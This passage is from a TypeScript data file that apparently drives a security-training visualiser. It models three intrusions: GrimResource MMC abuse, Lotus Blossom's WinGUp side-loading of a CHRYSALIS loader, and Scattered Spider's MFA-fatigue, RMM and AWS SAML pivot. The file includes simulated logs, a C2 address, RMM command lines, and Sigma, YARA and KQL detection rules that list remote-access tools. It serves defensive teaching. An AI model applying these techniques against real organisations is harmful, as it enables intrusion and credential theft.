    <Data Name="ParentCommandLine">"C:\\Windows\\System32\\mmc.exe" "C:\\Users\\j.doe\\Downloads\\sccm-Updater.msc"</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Suspicious Bare dllhost.exe Spawned by mmc.exe (GrimResource Injection)',
        ruleCode: `title: GrimResource MMC Spawning Sacrificial dllhost.exe
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\mmc.exe'
    Image|endswith: '\\dllhost.exe'
  filter_legit_com:
    CommandLine|contains: '/Processid:'
  condition: selection and not filter_legit_com
level: critical`,
        mitigation:
          'Alert on any dllhost.exe process spawned without /Processid:{GUID} command-line arguments, especially when parented by mmc.exe.',
      },
    },
  ],
};

export const ELASTIC_LOTUS_BLOSSOM_CHRYSALIS_SCENARIO: AttackScenario = {
  id: 'elastic-lotus-blossom-chrysalis',
  code: 'T1574.002',
  name: 'Elastic Security Labs — Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor',
  shortSubtitle: 'Elastic Security Labs · GUP.exe libcurl.dll Side-Loading, MurmurHash API & CHRYSALIS Implant',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Documented by Elastic Security Labs in their analysis of the Lotus Blossom APT group (Billbug / Dragonfish / Thrip), attackers abused the legitimate Notepad++ Generic Updater (GUP.exe / WinGUp) to side-load a malicious libcurl.dll. The loader resolves Windows APIs dynamically using custom FNV-1a and MurmurHash3 routines, decrypts an encrypted shellcode configuration file on disk, and deploys the modular CHRYSALIS backdoor in memory for long-term cyberespionage.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Elastic Security Labs — Lotus Blossom & CHRYSALIS Backdoor Intrusion Analysis',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1574.002 (DLL Side-Loading) · T1027.007 (Dynamic API Resolution) · T1071.001 (HTTPS C2)',
    },
    {
      term: 'SIDE-LOADED BINARY',
      value: 'GUP.exe (Signed WinGUp for Notepad++) -> Trojanized libcurl.dll',
    },
    {
      term: 'IMPLANT CRYPTO',
      value: 'FNV-1a & MurmurHash3 API Hashing + Custom XOR/RC4 Config Decryption',
    },
  ],
  nodes: [
    {
      id: 'lotus_c2_infra',
      label: 'Lotus Blossom C2 Server',
      sublabel: '203.0.113.84:443 (HTTPS C2)',
      role: 'attacker',
      x: 15,
      y: 45,
      details: {
        osOrType: 'Lotus Blossom (Billbug / Thrip) C2 Infrastructure',
        pidOrPort: 'TCP/443 (TLS 1.2 Custom Beacon)',
        privilege: 'APT Operator Infrastructure',
        artifacts: [
          'Spoofed HTTP User-Agent & TLS Session',
          'Tasking Commands: Reverse Shell, File Upload, Recon',
        ],
        description:
          'Command and Control infrastructure operated by Lotus Blossom receiving encrypted CHRYSALIS beacons.',
      },
    },
    {
      id: 'wks_gup_host',
      label: 'GUP.exe (Signed WinGUp)',
      sublabel: 'PID 4180 · ENG-WKS-12 (10.10.20.88)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Signed Legitimate Binary (WinGUp for Notepad++)',
        pidOrPort: 'PID 4180 · C:\\ProgramData\\NotepadPlus\\GUP.exe',
        privilege: 'Medium Integrity (Persistent Run Key)',
        artifacts: [
          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\NotepadUpdater',
          'Unsigned C:\\ProgramData\\NotepadPlus\\libcurl.dll',
        ],
        description:
          'Legitimate, digitally signed WinGUp binary used as a trusted host vessel to side-load malicious libcurl.dll from the same folder.',
      },
    },
    {
      id: 'chrysalis_mem_implant',
      label: 'libcurl.dll & CHRYSALIS RAM',
      sublabel: '0x0000021C90000000 (RWX Shellcode)',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'CHRYSALIS Modular Backdoor in GUP.exe RAM',
        pidOrPort: 'FNV-1a + MurmurHash3 API Resolver',
        privilege: 'In-Memory Implant',
        artifacts: [
          'Export: curl_easy_init -> Shellcode Decryptor',
          'Encrypted Blob: C:\\ProgramData\\NotepadPlus\\gup.dat',
        ],
        description:
          'Malicious libcurl.dll hijacks curl_easy_init, resolves NTDLL/Kernel32 exports via FNV-1a/MurmurHash, and maps CHRYSALIS into RWX memory.',
      },
    },
    {
      id: 'corp_ad_target',
      label: 'Internal File & AD Server',
      sublabel: '10.10.5.10 (Recon & Collection Target)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Enterprise File & Directory Server',
        pidOrPort: 'SMB :445 / LDAP :389',
        privilege: 'Targeted Enterprise Asset',
        artifacts: [
          'CHRYSALIS Interactive Shell Discovery',
          'Staged Recon Archives',
        ],
        description:
          'Internal server enumerated by CHRYSALIS interactive shell modules during post-exploitation.',
      },
    },
    {
      id: 'elastic_siem_sensor',
      label: 'Elastic Security EDR & SIEM',
      sublabel: 'Sysmon EID 7, 13 & Memory Scanner',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Elastic Defend & SIEM Detection Engine',
        pidOrPort: 'Sysmon EID 1, 3, 7, 13',
        privilege: 'SOC Monitoring',
        artifacts: [
          'Alert: Unsigned libcurl.dll Side-Loaded by GUP.exe',
          'YARA: Windows_Trojan_Chrysalis',
        ],
        description:
          'Flags unsigned libcurl.dll loaded from non-standard ProgramData paths and unbacked RWX memory inside GUP.exe.',
      },
    },
  ],
  processTree: [
    {
      pid: 4180,
      ppid: 2890,
      name: 'GUP.exe',
      commandLine: '"C:\\ProgramData\\NotepadPlus\\GUP.exe" -v',
      user: 'CORP\\a.chen',
      integrity: 'Medium',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'LoadLibraryA("libcurl.dll")',
        'CreateFileW("gup.dat")',
        'VirtualAlloc(MEM_COMMIT, PAGE_EXECUTE_READWRITE)',
        'WinHttpSendRequest',
      ],
      memoryBlocks: [
        {
          address: '0x0000021C90000000',
          section: 'CHRYSALIS Unpacked Backdoor',
          permissions: 'RWX',
          size: '164 KB',
          status: 'shellcode',
          description:
            'Decrypted CHRYSALIS implant loaded from gup.dat via libcurl.dll curl_easy_init hook.',
          hexPreview: '55 8B EC 83 EC 40 53 56 57 E8 00 00 00 00 5B 81',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'WINGUP (GUP.EXE) DLL SIDE-LOADING OF LIBCURL.DLL',
      subtitle: 'Signed GUP.exe loads trojanized libcurl.dll from C:\\ProgramData\\NotepadPlus',
      description:
        'Lotus Blossom establishes persistence via a Registry Run key pointing to a legitimate signed copy of WinGUp (GUP.exe) staged in C:\\ProgramData\\NotepadPlus\\. When GUP.exe executes, Windows DLL search-order mechanics load the attacker-supplied, unsigned libcurl.dll residing in the same directory and invoke its hijacked curl_easy_init export.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1574.002',
      mitreTechniqueName: 'Hijack Execution Flow: DLL Side-Loading',
      activeNodeIds: ['wks_gup_host', 'chrysalis_mem_implant', 'elastic_siem_sensor'],
      compromisedNodeIds: ['wks_gup_host', 'chrysalis_mem_implant'],
      keySpecs: [
        { term: 'HOST BINARY', value: 'C:\\ProgramData\\NotepadPlus\\GUP.exe (Signed WinGUp)' },
        { term: 'SIDE-LOADED DLL', value: 'C:\\ProgramData\\NotepadPlus\\libcurl.dll (Unsigned)' },
        { term: 'HIJACKED EXPORT', value: 'curl_easy_init / curl_easy_perform' },
      ],
    },
    {
      index: 2,
      title: 'FNV-1A / MURMURHASH API RESOLUTION & CHRYSALIS DECRYPTION',
      subtitle: 'Dynamic PEB walking and in-memory decryption of gup.dat payload',
      description:
        'As documented by Elastic Security Labs, the malicious libcurl.dll avoids static Import Address Table (IAT) entries by walking the PEB and hashing export names with FNV-1a and MurmurHash3. It then reads the encrypted payload file (gup.dat), allocates PAGE_EXECUTE_READWRITE memory via VirtualAlloc, and decrypts the modular CHRYSALIS backdoor in RAM.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1027.007',
      mitreTechniqueName: 'Obfuscated Files or Information: Dynamic API Resolution',
      activeNodeIds: ['wks_gup_host', 'chrysalis_mem_implant', 'elastic_siem_sensor'],
      compromisedNodeIds: ['wks_gup_host', 'chrysalis_mem_implant'],
      keySpecs: [
        { term: 'API HASHING', value: 'FNV-1a (0x811C9DC5) & MurmurHash3 PEB Export Resolution' },
        { term: 'PAYLOAD BLOB', value: 'C:\\ProgramData\\NotepadPlus\\gup.dat (Encrypted Shellcode)' },
        { term: 'MEMORY PROTECTION', value: 'VirtualAlloc (MEM_COMMIT | PAGE_EXECUTE_READWRITE)' },
      ],
    },
    {
      index: 3,
      title: 'CHRYSALIS HTTPS C2 BEACON & INTERACTIVE RECON',
      subtitle: 'Encrypted C2 channel from GUP.exe and internal network enumeration',
      description:
        'Running entirely inside the trusted GUP.exe address space, CHRYSALIS decrypts its embedded C2 configuration block, fingerprints the victim host (computer name, OS build, MAC address, domain membership), and initiates an encrypted HTTPS beacon to 203.0.113.84:443 to execute interactive reconnaissance and file exfiltration commands.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1071.001',
      mitreTechniqueName: 'Application Layer Protocol: Web Protocols',
      activeNodeIds: ['chrysalis_mem_implant', 'lotus_c2_infra', 'corp_ad_target', 'elastic_siem_sensor'],
      compromisedNodeIds: ['wks_gup_host', 'chrysalis_mem_implant', 'corp_ad_target'],
      keySpecs: [
        { term: 'C2 PROTOCOL', value: 'HTTPS TLS 1.2 (WinHTTP API from GUP.exe)' },
        { term: 'BACKDOOR FAMILY', value: 'CHRYSALIS (Lotus Blossom / Billbug)' },
        { term: 'CAPABILITIES', value: 'Reverse Shell, File Manager, Process Enumeration, C2 Sleep' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'el-lotus-1',
      no: 1,
      stageIndex: 1,
      timestamp: '08:15:19.220',
      sourceNodeId: 'wks_gup_host',
      targetNodeId: 'chrysalis_mem_implant',
      sourceLabel: 'GUP.exe (PID 4180)',
      targetLabel: 'libcurl.dll (Unsigned)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7',
      shortAction: 'SIDELOAD LIBCURL',
      info: 'Image=C:\\ProgramData\\NotepadPlus\\GUP.exe ImageLoaded=C:\\ProgramData\\NotepadPlus\\libcurl.dll Signed=false',
      sizeOrCode: 'Unsigned DLL',
      severity: 'HIGH',
      mitreId: 'T1574.002',
      explanation:
        'Sysmon Event ID 7 captures signed GUP.exe loading an unsigned libcurl.dll from a writable ProgramData directory—a classic DLL side-loading signature used by Lotus Blossom.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>7</EventID>
    <Computer>ENG-WKS-12.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\ProgramData\\NotepadPlus\\GUP.exe</Data>
    <Data Name="ImageLoaded">C:\\ProgramData\\NotepadPlus\\libcurl.dll</Data>
    <Data Name="Signed">false</Data>
    <Data Name="Hashes">SHA256=8A4F1C9E2B7D09A3E5F61234890ABCDEF1234567890ABCDEF1234567890ABCDE</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'WinGUp (GUP.exe) DLL Side-Loading Unsigned libcurl.dll',
        ruleCode: `title: Lotus Blossom WinGUp libcurl.dll Side-Loading
logsource:
  category: image_load
  product: windows
detection:
  selection:
    Image|endswith: '\\GUP.exe'
    ImageLoaded|endswith: '\\libcurl.dll'
    Signed: 'false'
  condition: selection
level: high`,
        mitigation:
          'Enforce Windows Defender Application Control (WDAC) / AppLocker rules blocking unsigned DLL loads from C:\\ProgramData\\ and user-writable folders.',
      },
    },
    {
      id: 'el-lotus-2',
      no: 2,
      stageIndex: 2,
      timestamp: '08:15:19.640',
      sourceNodeId: 'chrysalis_mem_implant',
      targetNodeId: 'elastic_siem_sensor',
      sourceLabel: 'libcurl.dll (GUP.exe)',
      targetLabel: 'VAD 0x021C90000000',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'Elastic Memory Scan',
      shortAction: 'CHRYSALIS UNPACK',
      info: 'Unbacked RWX Shellcode + FNV-1a (0x811C9DC5) & MurmurHash3 API Resolution in GUP.exe',
      sizeOrCode: '164 KB RWX',
      severity: 'CRITICAL',
      mitreId: 'T1027.007',
      explanation:
        'Elastic Security Labs documented that CHRYSALIS uses FNV-1a and MurmurHash3 to resolve APIs dynamically and decrypts its modular implant into unbacked RWX memory.',
      rawLog: `[ELASTIC_DEFEND_MEMORY_ALERT]
Process: C:\\ProgramData\\NotepadPlus\\GUP.exe (PID 4180)
Region: 0x0000021C90000000 | Size: 167936 | Protection: PAGE_EXECUTE_READWRITE
BackingModule: Unbacked (Private Commit)
MatchedYara: Windows_Trojan_Chrysalis (FNV1a_Seed=0x811c9dc5, MurmurHash3_Constant=0xcc9e2d51)`,
      detectionRule: {
        type: 'YARA',
        title: 'Elastic Security Labs YARA — Windows.Trojan.Chrysalis',
        ruleCode: `rule Windows_Trojan_Chrysalis {
  meta:
    author = "Elastic Security Labs"
    actor = "Lotus Blossom APT"
  strings:
    $fnv1a = { C7 ?? C5 9D 1C 81 }
    $murmur1 = { 69 ?? 51 2D 9E CC }
    $murmur2 = { 69 ?? 93 35 87 1B }
  condition:
    uint16(0) == 0x5A4D and all of them
}`,
        mitigation:
          'Enable EDR memory scanning for unbacked executable memory regions and hunt for FNV-1a/MurmurHash3 constants in unsigned DLLs.',
      },
    },
    {
      id: 'el-lotus-3',
      no: 3,
      stageIndex: 3,
      timestamp: '08:15:21.105',
      sourceNodeId: 'wks_gup_host',
      targetNodeId: 'lotus_c2_infra',
      sourceLabel: '10.10.20.88 (GUP.exe)',
      targetLabel: '203.0.113.84:443',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 3',
      shortAction: 'HTTPS C2 BEACON',
      info: 'Image=C:\\ProgramData\\NotepadPlus\\GUP.exe DestinationIp=203.0.113.84 DestinationPort=443',
      sizeOrCode: 'TLS 1.2',
      severity: 'CRITICAL',
      mitreId: 'T1071.001',
      explanation:
        'GUP.exe executing from C:\\ProgramData\\NotepadPlus\\ initiates persistent outbound HTTPS C2 connections to the Lotus Blossom server.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>3</EventID>
    <Computer>ENG-WKS-12.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\ProgramData\\NotepadPlus\\GUP.exe</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="SourceIp">10.10.20.88</Data>
    <Data Name="DestinationIp">203.0.113.84</Data>
    <Data Name="DestinationPort">443</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'GUP.exe Executing from Non-Standard Path Making Network Connections',
        ruleCode: `title: Suspicious Outbound Network Connection by Relocated GUP.exe
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Image|endswith: '\\GUP.exe'
    Initiated: 'true'
  filter_legit:
    Image|startswith:
      - 'C:\\Program Files\\Notepad++\\'
      - 'C:\\Program Files (x86)\\Notepad++\\'
  condition: selection and not filter_legit
level: high`,
        mitigation:
          'Restrict GUP.exe execution to official Program Files paths and block outbound connections from binaries running out of C:\\ProgramData\\.',
      },
    },
  ],
};

export const UNIT42_SCATTERED_SPIDER_CLOUD_SCENARIO: AttackScenario = {
  id: 'unit42-scattered-spider-cloud',
  code: 'T1078.004',
  name: 'Unit 42 & CISA — Scattered Spider (Muddled Libra): SSO MFA Fatigue, RMM & AWS/ESXi Pivot',
  shortSubtitle: 'Palo Alto Unit 42 / CISA AA23-320A · Okta Identity Takeover, FleetDeck RMM & Cloud SAML Pivot',
  category: 'ACTIVE_DIRECTORY',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Tracked as Muddled Libra by Palo Alto Networks Unit 42, Octo Tempest by Microsoft, and UNC3944 / Scattered Spider in CISA Advisory AA23-320A, this threat group specializes in identity provider (Okta / Entra ID) social engineering and SMS/MFA fatigue. Once inside SSO, they register rogue MFA devices, deploy legitimate Remote Monitoring and Management (RMM) tools (ScreenConnect, FleetDeck, ngrok), pivot into AWS via SAML federation (AssumeRoleWithSAML), and compromise VMware vCenter/ESXi hypervisors.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Palo Alto Networks Unit 42 (Muddled Libra) & CISA Joint Advisory AA23-320A',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1621 (MFA Fatigue) · T1219 (Remote Access Tools) · T1078.004 (Cloud Accounts)',
    },
    {
      term: 'IDENTITY & RMM TOOLS',
      value: 'Okta FastPass / TOTP Enrollment · ScreenConnect, FleetDeck, Tailscale, Ngrok',
    },
    {
      term: 'CLOUD / HYPERVISOR',
      value: 'AWS STS AssumeRoleWithSAML + VMware ESXi SSH & VMDK Impact',
    },
  ],
  nodes: [
    {
      id: 'muddled_libra_actor',
      label: 'Muddled Libra (UNC3944)',
      sublabel: 'Residential Proxy · Helpdesk Vishing',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'Scattered Spider / Muddled Libra Operator',
        pidOrPort: 'Residential Proxy / Mullvad VPN',
        privilege: 'External Identity Attacker',
        artifacts: [
          '0ktapush Phishing Kit & Helpdesk Social Engineering',
          'Rogue WebAuthn / TOTP Factor Registration',
        ],
        description:
          'Threat actor using SMS phishing and IT helpdesk social engineering to trigger MFA push fatigue and enroll a rogue authenticator.',
      },
    },
    {
      id: 'okta_idp_portal',
      label: 'Okta / Entra ID SSO Portal',
      sublabel: 'corp.okta.com (Federation Hub)',
      role: 'domain_controller',
      x: 42,
      y: 26,
      details: {
        osOrType: 'Enterprise Identity Provider (IdP)',
        pidOrPort: 'SAML 2.0 / OIDC Federation',
        privilege: 'Tier-0 Identity Control Plane',
        artifacts: [
          'user.mfa.factor.activate (New TOTP Enrolled)',
          'user.authentication.sso -> AWS Production Account',
        ],
        description:
          'Corporate Single Sign-On portal where the attacker activates a secondary MFA factor and launches SAML assertions into AWS and Citrix/VPN.',
      },
    },
    {
      id: 'admin_wks_rmm',
      label: 'Admin Endpoint (RMM Persistence)',
      sublabel: 'IT-ADM-02 (10.10.8.19 · ScreenConnect)',
      role: 'victim_host',
      x: 52,
      y: 72,
      details: {
        osOrType: 'Windows 11 Admin Workstation',
        pidOrPort: 'ScreenConnect.ClientService.exe & ngrok.exe',
        privilege: 'IT Administrator',
        artifacts: [
          'C:\\Program Files (x86)\\ScreenConnect Client\\ScreenConnect.ClientService.exe',
          'ngrok.exe tcp 3389',
        ],
        description:
          'Compromised IT administrator endpoint where Muddled Libra installs legitimate signed RMM agents to maintain persistent access even if SSO passwords are reset.',
      },
    },
    {
      id: 'aws_esxi_infra',
      label: 'AWS IAM & VMware ESXi Cluster',
      sublabel: 'AWS STS + vCenter 10.10.1.50',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Hybrid Cloud (AWS Prod VPC & VMware vSphere)',
        pidOrPort: 'AWS AssumeRoleWithSAML & ESXi SSH :22',
        privilege: 'Cloud Admin & Hypervisor Root',
        artifacts: [
          'CloudTrail: AssumeRoleWithSAML (AdminRole)',
          'CloudTrail: CreateAccessKey & EC2 Secrets Manager Dump',
        ],
        description:
          'Production AWS environment and VMware ESXi hypervisor cluster accessed via federated SAML tokens to extract secrets and stage hypervisor encryption.',
      },
    },
    {
      id: 'unit42_cdr_siem',
      label: 'Prisma Cloud & SIEM',
      sublabel: 'Okta SystemLog + AWS CloudTrail + Sysmon',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Identity & Cloud Detection Platform',
        pidOrPort: 'Okta SystemLog, CloudTrail & Sysmon',
        privilege: 'SOC Monitoring',
        artifacts: [
          'Alert: New MFA Factor Followed by SAML AssumeRole',
          'Alert: Unauthorized RMM Tool Execution (ScreenConnect/FleetDeck)',
        ],
        description:
          'Correlates Okta MFA factor registration events with endpoint RMM installation and AWS CloudTrail privilege escalation.',
      },
    },
  ],
  processTree: [
    {
      pid: 7104,
      ppid: 1420,
      name: 'msiexec.exe',
      commandLine:
        'msiexec.exe /i "C:\\Users\\it.admin\\Downloads\\ScreenConnect.ClientSetup.msi" /qn',
      user: 'CORP\\it.admin',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 2,
      apiCalls: ['CreateServiceW("ScreenConnect Client")', 'StartServiceW'],
    },
    {
      pid: 7488,
      ppid: 680,
      name: 'ScreenConnect.ClientService.exe',
      commandLine:
        '"C:\\Program Files (x86)\\ScreenConnect Client (a8f2c1)\\ScreenConnect.ClientService.exe"',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: ['Connect("relay.screenconnect.com:443")', 'CreateProcessAsUserW'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'OKTA MFA PUSH FATIGUE & ROGUE DEVICE ENROLLMENT',
      subtitle: 'Social engineering & MFA bombing leading to user.mfa.factor.activate',
      description:
        'As detailed by Unit 42 and CISA AA23-320A, Muddled Libraharvests credentials via an AiTM phishing portal or vishing call to the IT helpdesk, bombards the target with MFA push notifications (T1621), and immediately registers their own TOTP / WebAuthn factor in Okta (user.mfa.factor.activate) for persistent identity access.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1621',
      mitreTechniqueName: 'Multi-Factor Authentication Request Generation',
      activeNodeIds: ['muddled_libra_actor', 'okta_idp_portal', 'unit42_cdr_siem'],
      compromisedNodeIds: ['okta_idp_portal'],
      keySpecs: [
        { term: 'OKTA EVENT', value: 'system.push.send_factor_verify_push -> user.mfa.factor.activate' },
        { term: 'TARGET ROLE', value: 'IT Helpdesk / Cloud SuperAdmin' },
        { term: 'SOURCE ANOMALY', value: 'Residential Proxy / Anonymizing VPN ASN' },
      ],
    },
    {
      index: 2,
      title: 'AUTHORIZED RMM TOOL DEPLOYMENT (SCREENCONNECT / NGROK)',
      subtitle: 'Living-off-the-land persistence via legitimate remote management binaries',
      description:
        'To survive identity remediation, the attacker deploys multiple commercial Remote Monitoring and Management (RMM) tools—such as ConnectWise ScreenConnect, FleetDeck, AnyDesk, and ngrok—onto admin workstations (T1219). Because these binaries are digitally signed, they bypass traditional antivirus signatures.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1219',
      mitreTechniqueName: 'Remote Access Software',
      activeNodeIds: ['okta_idp_portal', 'admin_wks_rmm', 'unit42_cdr_siem'],
      compromisedNodeIds: ['okta_idp_portal', 'admin_wks_rmm'],
      keySpecs: [
        { term: 'RMM BINARIES', value: 'ScreenConnect.ClientService.exe, fleetdeck_agent.exe, ngrok.exe' },
        { term: 'PRIVILEGE', value: 'Installed as Windows Service running as NT AUTHORITY\\SYSTEM' },
        { term: 'C2 CHANNEL', value: 'Outbound TLS :443 to tenant-specific ScreenConnect relay' },
      ],
    },
    {
      index: 3,
      title: 'SAML FEDERATION PIVOT TO AWS & VMWARE VCENTER',
      subtitle: 'AssumeRoleWithSAML into AWS Production + CreateAccessKey & ESXi SSH',
      description:
        'Using the compromised Okta SSO session, the attacker pivots into AWS via SAML 2.0 federation (AssumeRoleWithSAML), generates long-lived IAM access keys (CreateAccessKey), queries EC2/Secrets Manager, and uses harvested vSphere credentials to SSH into VMware ESXi hypervisors.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1078.004',
      mitreTechniqueName: 'Valid Accounts: Cloud Accounts',
      activeNodeIds: ['okta_idp_portal', 'aws_esxi_infra', 'unit42_cdr_siem'],
      compromisedNodeIds: ['okta_idp_portal', 'admin_wks_rmm', 'aws_esxi_infra'],
      keySpecs: [
        { term: 'AWS CLOUDTRAIL', value: 'AssumeRoleWithSAML -> iam:CreateAccessKey -> secretsmanager:GetSecretValue' },
        { term: 'HYPERVISOR PIVOT', value: 'VMware vCenter SSO & ESXi SSH Enabled' },
        { term: 'CISA ADVISORY', value: 'AA23-320A (Scattered Spider TTPs)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'u42-ss-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:05:11.402',
      sourceNodeId: 'muddled_libra_actor',
      targetNodeId: 'okta_idp_portal',
      sourceLabel: '198.51.100.210 (Proxy)',
      targetLabel: 'corp.okta.com',
      sourceType: 'NETWORK',
      protocolOrEventId: 'Okta SystemLog',
      shortAction: 'MFA FACTOR ENROLL',
      info: 'eventType="user.mfa.factor.activate" outcome="SUCCESS" factorType="token:software:totp"',
      sizeOrCode: 'Okta MFA',
      severity: 'HIGH',
      mitreId: 'T1621',
      explanation:
        'Okta SystemLog records a burst of denied push challenges followed by a successful push and immediate activation of a new software TOTP factor from a new ASN.',
      rawLog: `{
  "eventType": "user.mfa.factor.activate",
  "outcome": { "result": "SUCCESS" },
  "actor": { "alternateId": "it.admin@corp.local", "displayName": "IT Admin" },
  "client": { "ipAddress": "198.51.100.210", "userAgent": { "rawUserAgent": "Mozilla/5.0 (X11; Linux x86_64)" } },
  "debugContext": { "debugData": { "factor": "GOOGLE_OTP", "requestUri": "/api/v1/users/00u1/factors/ost1/lifecycle/activate" } }
}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Okta New MFA Factor Enrolled After Push Fatigue Burst',
        ruleCode: `title: Okta Suspicious MFA Factor Enrollment
logsource:
  product: okta
  service: okta
detection:
  selection:
    eventType:
      - 'user.mfa.factor.activate'
      - 'user.mfa.factor.update'
    outcome.result: 'SUCCESS'
  condition: selection
level: high`,
        mitigation:
          'Enforce phishing-resistant FIDO2/WebAuthn (Okta FastPass with number matching / device-bound keys) and require identity verification out-of-band before helpdesk MFA resets.',
      },
    },
    {
      id: 'u42-ss-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:12:38.905',
      sourceNodeId: 'admin_wks_rmm',
      targetNodeId: 'unit42_cdr_siem',
      sourceLabel: 'IT-ADM-02',
      targetLabel: 'Sysmon EID 1 / 7045',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'RMM SCREENCONNECT',
      info: 'Image=ScreenConnect.ClientService.exe User=NT AUTHORITY\\SYSTEM',
      sizeOrCode: 'PID 7488',
      severity: 'HIGH',
      mitreId: 'T1219',
      explanation:
        'CISA AA23-320A highlights Scattered Spider installing unauthorized RMM agents (ScreenConnect, FleetDeck, AnyDesk) to retain persistent access across the enterprise.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>IT-ADM-02.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">7488</Data>
    <Data Name="Image">C:\\Program Files (x86)\\ScreenConnect Client (a8f2c1)\\ScreenConnect.ClientService.exe</Data>
    <Data Name="CommandLine">"C:\\Program Files (x86)\\ScreenConnect Client (a8f2c1)\\ScreenConnect.ClientService.exe" "?e=Access&amp;y=Guest&amp;h=instance-r9x.screenconnect.com&amp;p=443"</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Unauthorized RMM Agent Execution (CISA AA23-320A Scattered Spider)',
        ruleCode: `title: Suspicious Remote Monitoring and Management (RMM) Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\\ScreenConnect.ClientService.exe'
      - '\\fleetdeck_agent.exe'
      - '\\AnyDesk.exe'
      - '\\ngrok.exe'
  condition: selection
level: high`,
        mitigation:
          'Block unapproved RMM domains at the firewall/DNS layer and enforce application allowlisting for remote support binaries.',
      },
    },
    {
      id: 'u42-ss-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:19:44.112',
      sourceNodeId: 'okta_idp_portal',
      targetNodeId: 'aws_esxi_infra',
      sourceLabel: 'Okta SAML Federation',
      targetLabel: 'AWS STS / CloudTrail',
      sourceType: 'NETWORK',
      protocolOrEventId: 'CloudTrail STS/IAM',
      shortAction: 'ASSUMEROLE + KEY',
      info: 'eventName="AssumeRoleWithSAML" -> "CreateAccessKey" userName="svc-ci-deploy"',
      sizeOrCode: 'AKIA...Key',
      severity: 'CRITICAL',
      mitreId: 'T1078.004',
      explanation:
        'Following SAML federation into AWS, Muddled Libra calls iam:CreateAccessKey on privileged IAM users/roles to maintain direct API access independent of Okta.',
      rawLog: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3X7EXAMPLE:it.admin@corp.local",
    "arn": "arn:aws:sts::123456789012:assumed-role/OktaAdminRole/it.admin@corp.local"
  },
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "sourceIPAddress": "198.51.100.210",
  "requestParameters": { "userName": "svc-ci-deploy" }
}`,
      detectionRule: {
        type: 'KQL',
        title: 'Federated SAML Session Creating Permanent AWS IAM Access Keys',
        ruleCode: `AWSCloudTrail
| where EventSource == "iam.amazonaws.com" and EventName == "CreateAccessKey"
| where UserIdentityType == "AssumedRole" and UserIdentityPrincipalId has "@"
| project TimeGenerated, SourceIpAddress, UserIdentityArn, RequestParameters`,
        mitigation:
          'Apply AWS Service Control Policies (SCPs) prohibiting long-lived IAM Access Key creation and isolate VMware vCenter/ESXi management interfaces from standard SSO tiers.',
      },
    },
  ],
};

export const ELASTIC_APT41_DUSTPAN_STEALTHVECTOR_SCENARIO: AttackScenario = {
  id: 'elastic-apt41-dustpan-stealthvector',
  code: 'T1620',
  name: 'Elastic & Mandiant — APT41 (Brass Typhoon): DodgeBox, Call-Stack Spoofing & DUSTPAN Loader',
